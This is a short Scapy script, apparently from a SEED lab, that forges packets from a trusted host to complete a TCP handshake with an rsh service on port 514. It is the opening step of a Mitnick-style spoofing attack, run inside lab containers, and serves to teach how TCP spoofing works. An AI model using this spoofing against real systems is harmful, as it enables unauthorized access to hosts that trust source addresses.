#!/usr/bin/env python3
"""Observe a SYN-ACK and finish the first TCP handshake in SEED.
This program uses the observed TCP sequence field, not the captured ACK.
Run: sudo docker exec -it seed-attacker python3 /volumes/handshake.py
"""
import os
from threading import Thread
from time import sleep
from scapy.all import IP, TCP, send, sniff

TRUSTED_IP = "10.9.0.6"
TARGET_IP = "10.9.0.5"
IFACE = os.environ.get("LAB_IFACE", "br-6514365f0955")
SOURCE_PORT = 1023
TARGET_PORT = 514
CLIENT_ISN = 0x1000
completed = False


def handle_synack(packet):
    global completed
    if completed or not packet.haslayer(TCP):
        return
    tcp = packet[TCP]
    if tcp.flags != "SA":
        return
    completed = True
    server_isn = tcp.seq
    next_client_seq = (CLIENT_ISN + 1) % (2**32)
    next_server_ack = (server_isn + 1) % (2**32)
    print(f"[+] Observed server ISN: {server_isn}", flush=True)

    final_ack = (
        IP(src=TRUSTED_IP, dst=TARGET_IP)
        / TCP(sport=SOURCE_PORT, dport=TARGET_PORT,
              flags="A", seq=next_client_seq, ack=next_server_ack)
    )
    send(final_ack, verbose=False)
    print("[+] Final ACK sent", flush=True)


def send_initial_syn():
    sleep(1)  # Give the sniffer time to start.
    syn = (
        IP(src=TRUSTED_IP, dst=TARGET_IP)
        / TCP(sport=SOURCE_PORT, dport=TARGET_PORT,
              flags="S", seq=CLIENT_ISN)
    )
    send(syn, count=1, verbose=False)
    print("[+] Initial SYN sent", flush=True)


if __name__ == "__main__":
    print(f"[*] Monitoring {IFACE}", flush=True)
    Thread(target=send_initial_syn, daemon=True).start()
    sniff(
        iface=IFACE,
        filter=(f"tcp and src host {TARGET_IP} and dst host {TRUSTED_IP} "
                f"and src port {TARGET_PORT} and dst port {SOURCE_PORT}"),
        prn=handle_synack,
        stop_filter=lambda _packet: completed,
        timeout=15,
        store=False,
    )
    print("[*] Handshake test finished", flush=True)
